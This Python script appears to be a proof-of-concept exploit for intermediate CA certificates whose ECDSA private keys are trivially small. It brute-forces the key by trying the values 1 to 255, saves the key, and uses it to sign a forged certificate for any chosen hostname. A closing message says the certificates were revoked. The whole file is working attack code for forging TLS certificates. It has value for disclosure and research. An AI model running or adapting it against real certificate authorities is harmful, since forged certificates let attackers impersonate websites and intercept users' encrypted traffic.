import os
import sys
from pathlib import Path
from cryptography import x509
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.serialization import load_pem_private_key
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives import hashes
from cryptography.x509.oid import NameOID
import datetime

output_path = Path("./forged_certs")

def read_p384_from_certificate(path: str):
    data = Path(path).read_bytes()

    try:
        cert = x509.load_pem_x509_certificate(data)
    except ValueError as exc:
        raise ValueError("No PEM block found, check the supplied file.") from exc

    pub = cert.public_key()
    if not isinstance(pub, ec.EllipticCurvePublicKey):
        raise TypeError(f"Not an ECDSA public key, but {type(pub).__name__}")

    return pub


def brute_force_certificate(cert_path: Path):
    print(f"Step 1: Brute forcing the private key from the certificate {cert_path}.")
    pub = read_p384_from_certificate(cert_path)

    for i in range(1, 256):
        candidate_private_key = ec.derive_private_key(int(i), ec.SECP384R1())
        candidate_public_key = candidate_private_key.public_key()

        x = candidate_public_key.public_numbers().x
        y = candidate_public_key.public_numbers().y

        if pub.public_numbers().x == x and pub.public_numbers().y == y:
            print("- Brute forced the private key from the certificate.")
            print(f"- Super secure value of the private key => {i}")
            pem_data = candidate_private_key.private_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PrivateFormat.TraditionalOpenSSL,
                encryption_algorithm=serialization.NoEncryption(),
            )

            key_path = output_path / (sys.argv[1] + ".key")
            key_path.write_bytes(pem_data)
            os.chmod(key_path, 0o600)
            print(f"- Private key written to {key_path}")

            output_cert = output_path / sys.argv[1];
            output_cert.write_bytes(Path(cert_path).read_bytes())
            print(f"- Certificate copied to {output_cert}\n")
            return


def create_new_public_certificate(hostname: str):
    print(f"Step 2: Create a new public certificate for {hostname} signed by the forged intermediate CA.")
    output_path = Path("./forged_certs")
    # Create the localhost server key and CSR
    intermediate_private_key = output_path / (sys.argv[1] + ".key")
    intermediate_private_key = load_pem_private_key(intermediate_private_key.read_bytes(), password=None)
    intermediate_cert = output_path / sys.argv[1]
    intermediate_cert = x509.load_pem_x509_certificate(intermediate_cert.read_bytes())
    public_key_encoding = serialization.Encoding.DER
    public_key_format = serialization.PublicFormat.SubjectPublicKeyInfo
    if intermediate_private_key.public_key().public_bytes(
        public_key_encoding, public_key_format
    ) != intermediate_cert.public_key().public_bytes(public_key_encoding, public_key_format):
        raise ValueError("The intermediate private key does not match the supplied certificate.")

    try:
        ca_constraints = intermediate_cert.extensions.get_extension_for_class(x509.BasicConstraints).value
    except x509.ExtensionNotFound as exc:
        raise ValueError("The supplied issuer certificate has no BasicConstraints extension.") from exc
    if not ca_constraints.ca:
        raise ValueError("The supplied issuer certificate is not a CA certificate.")

    try:
        issuer_ski = intermediate_cert.extensions.get_extension_for_class(
            x509.SubjectKeyIdentifier
        ).value
        authority_key_identifier = x509.AuthorityKeyIdentifier.from_issuer_subject_key_identifier(
            issuer_ski
        )
    except x509.ExtensionNotFound:
        authority_key_identifier = x509.AuthorityKeyIdentifier.from_issuer_public_key(
            intermediate_cert.public_key()
        )

    subject = x509.Name([x509.NameAttribute(x509.NameOID.COMMON_NAME, hostname)])

    ee_key = ec.generate_private_key(ec.SECP256R1())
    subject = x509.Name([
        x509.NameAttribute(NameOID.COUNTRY_NAME, "US"),
        x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, "California"),
        x509.NameAttribute(NameOID.LOCALITY_NAME, "San Francisco"),
        x509.NameAttribute(NameOID.ORGANIZATION_NAME, f"EXAMPLE"),
        x509.NameAttribute(NameOID.COMMON_NAME, hostname),
    ])
    ee_cert = x509.CertificateBuilder().subject_name(
        subject
    ).issuer_name(
        intermediate_cert.subject
    ).public_key(
        ee_key.public_key()
    ).serial_number(
        x509.random_serial_number()
    ).not_valid_before(
        datetime.datetime.now(datetime.timezone.utc)
    ).not_valid_after(
        # Our cert will be valid for 10 days
        datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(days=10)
    ).add_extension(
        x509.SubjectAlternativeName([
            # Describe what sites we want this certificate for.
            x509.DNSName(hostname)
        ]),
        critical=False,
    ).add_extension(
        x509.BasicConstraints(ca=False, path_length=None),
        critical=True,
    ).add_extension(
        x509.KeyUsage(
            digital_signature=True,
            content_commitment=False,
            key_encipherment=False,
            data_encipherment=False,
            key_agreement=False,
            key_cert_sign=False,
            crl_sign=False,
            encipher_only=None,
            decipher_only=None,
        ),
        critical=True,
    ).add_extension(
        x509.ExtendedKeyUsage([
            x509.ExtendedKeyUsageOID.CLIENT_AUTH,
            x509.ExtendedKeyUsageOID.SERVER_AUTH,
        ]),
        critical=False,
    ).add_extension(
        x509.SubjectKeyIdentifier.from_public_key(ee_key.public_key()),
        critical=False,
    ).add_extension(
        authority_key_identifier,
        critical=False,
    ).sign(intermediate_private_key, hashes.SHA256())

    # Include the issuer certificate after the leaf so clients can build the chain.
    ee_cert_pem = (
        ee_cert.public_bytes(serialization.Encoding.PEM)
        + intermediate_cert.public_bytes(serialization.Encoding.PEM)
    )
    cert_output_path = output_path / f"{sys.argv[2]}.pem"
    Path(cert_output_path).write_bytes(ee_cert_pem)
    os.chmod(cert_output_path, 0o600)
    print(f"- New public certificate written to {cert_output_path}")
    output_key_path = output_path / f"{sys.argv[2]}.key"
    ee_key_pem = ee_key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.TraditionalOpenSSL,
        encryption_algorithm=serialization.NoEncryption(),
    )
    Path(output_key_path).write_bytes(ee_key_pem)
    os.chmod(output_key_path, 0o600)
    print(f"- New private key written to {output_key_path}")
    print(f"\nStep 3: The cert/key pair can now be used to test if it's possible to impersonate {sys.argv[2]} in a TLS connection. (Hopefully not, as the certs were revoked)\n")


def main():
    brute_force_certificate(Path("./public_certs") / sys.argv[1])
    create_new_public_certificate(sys.argv[2])


if __name__ == "__main__":
    if len(sys.argv) != 3:
        certificates_available = [f.name for f in Path("./public_certs").glob("*.crt.pem")]
        usage_banner = f"Usage: {Path(sys.argv[0]).name} <certificate.pem> <impersonated_hostname>\nAvailable certificates: {certificates_available}\nExample: {Path(sys.argv[0]).name} EM-DV-TLS-CA-G3B.crt.pem example.com"
        raise SystemExit(usage_banner)
    main()